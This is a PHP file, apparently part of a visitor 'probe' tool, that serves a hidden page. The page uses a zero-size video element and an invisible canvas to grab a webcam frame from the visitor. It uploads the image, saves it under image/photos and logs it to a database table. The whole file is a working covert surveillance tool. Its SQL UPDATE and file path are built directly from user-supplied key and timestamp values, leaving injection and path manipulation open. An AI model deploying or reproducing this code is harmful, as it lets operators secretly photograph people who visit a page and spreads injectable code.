<?php
//error_reporting(0);

$file = isset($_POST['file']) ? $_POST['file'] : NULL;
if ($time == NULL) {
    $time = isset($_POST['timestamp']) ? $_POST['timestamp'] : NULL;
}
if ($key == NULL) {
    $key = isset($_POST['key']) ? $_POST['key'] : NULL;
}
if ($file != NULL) {
    session_start();

    // 验证CSRF令牌
    if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
        $file = explode(',', $file); //截取data:image/png;base64, 这个逗号后的字符
        $data = base64_decode($file[1]); //对截取后的字符使用base64_decode进行解码
        $url = dirname(__FILE__, 3) . "/image/photos/" . $key . "_" . $time . ".jpg";
        $writeurl = "/image/photos/" . $key . "_" . $time . ".jpg";
        file_put_contents($url, $data); //写入文件并保存
        // 根据timestamp & key写数据
        include_once(dirname(__FILE__, 2) . "/mySQL/dbconfig.php");
        $conn = new mysqli($db_host . ":" . $db_port, $db_user, $db_password, $db_name);
        $sql = "UPDATE `tanzhen_information` SET `cameraphoto` = '$writeurl' WHERE `tanzhen_information`.`timestamp` = '$time' AND `tanzhen_information`.`keyvalue` = '$key';";
        if ($conn->query($sql) === TRUE) {
            echo '插入成功';
        } else {
            echo '插入失败' . $conn->error;
        }
        $conn->close();
    } else {
        // CSRF令牌验证失败，处理错误
        echo "CSRF令牌验证失败！";
    }
} else {
    $tempCSRF = $_SESSION['csrf_token'];
    echo "
  <!DOCTYPE html>
  <html>
  <head>
  <script src='https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js'></script>
  </head>
  <body>
  
  <video id='myVideo' width='0' height='0'></video>
  <canvas id='myCanvas' style='display: none;' height='960' width='1600'></canvas>
  <script type='text/javascript'>
  function initCamera(){
      let video = document.getElementById('myVideo');
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          // 调用用户媒体设备，访问摄像头
          navigator.mediaDevices.getUserMedia({video: {width: 1600, height: 960}})
              .then(success)
              .catch(error);
      } else {
          // 处理不支持的情况
          handleUnsupported();
      }
  }
  
  function success(stream) {
      let video = document.getElementById('myVideo');
      video.srcObject = stream;
      video.play();
      takeCamera();
  }
  
  function error(error) {
      handleUnsupported();
      sendFailData('获取失败');
  }
  
  function handleUnsupported() {
      console.log('浏览器不支持获取用户媒体设备。');
      sendFailData('获取失败');
  }
  
  function takeCamera() {
      let canvas = document.getElementById('myCanvas');
      var context = canvas.getContext('2d');
      let video = document.getElementById('myVideo');
      context.drawImage(video, 0, 0);
      var src = canvas.toDataURL('image/jpeg');
      sendImageData(src);
  }
  
  function sendImageData(imageData) {
      $.ajax({
          url: 'https://' + window.location.hostname + '/modules/getInformation/camera.php',
          type: 'POST',
          data: {
              file: imageData,
              key: '$key',
              timestamp: '$time',
              csrf_token: '$tempCSRF'
          },
          success: function(response) {
              console.log('图像数据已发送。服务器响应：' + response);
          },
          error: function(error) {
              console.log('发送图像数据失败：' + error.statusText);
          }
      });
  }
  
  function sendFailData(message) {
      $.ajax({
          url: 'https://' + window.location.hostname + '/modules/getInformation/camera.php',
          type: 'POST',
          data: {
              file: message,
              key: '$key',
              timestamp: '$time',
              csrf_token: '$tempCSRF'
          },
          success: function(response) {
              console.log('失败数据已发送。服务器响应：' + response);
          },
          error: function(error) {
              console.log('发送失败数据失败：' + error.statusText);
          }
      });
  }
  
  initCamera();
  </script>
  </body>
  </html>
  
";
}
